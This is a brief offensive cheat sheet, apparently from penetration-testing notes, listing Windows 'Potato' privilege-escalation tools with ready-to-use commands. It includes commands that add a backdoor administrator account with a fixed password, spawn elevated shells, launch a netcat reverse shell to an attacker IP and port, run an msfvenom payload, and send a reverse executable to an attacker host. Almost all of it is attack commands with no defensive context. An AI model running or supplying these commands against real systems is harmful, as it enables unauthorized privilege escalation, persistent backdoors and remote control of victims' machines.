# 🥔 Potatoes

## God Potato

Check usage on [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato).

This is the best potato and can also be use to add an Administrator user when a shell is unstable

```
GodPotato -cmd "net user /add backdoor Password123"
GodPotato -cmd "net localgroup administrators /add backdoor"
```

## PrintSpoofer

The next best after Godpotato, get it from [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

```
PrintSpoofer.exe -i -c powershell.exe
```

## SweetPotato

```
.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc64.exe -a "<ip> <port> -e cmd"
```

Get it from here [https://github.com/carr0t2/SweetPotato/releases/tag/v1.0.0](https://github.com/carr0t2/SweetPotato/releases/tag/v1.0.0)

## Juicy Potato

1. Get a shell.exe ready from msfvenom
2. Use the port used in shell.exe and get CLSID from [https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

{% code overflow="wrap" %}
```
jp.exe -l 8000 -p C:\Users\Public\shell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```
{% endcode %}

## Hot Potato

{% code overflow="wrap" %}
```
.\potato.exe -ip <attacker ip> -cmd "C:\Path\to\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```
{% endcode %}
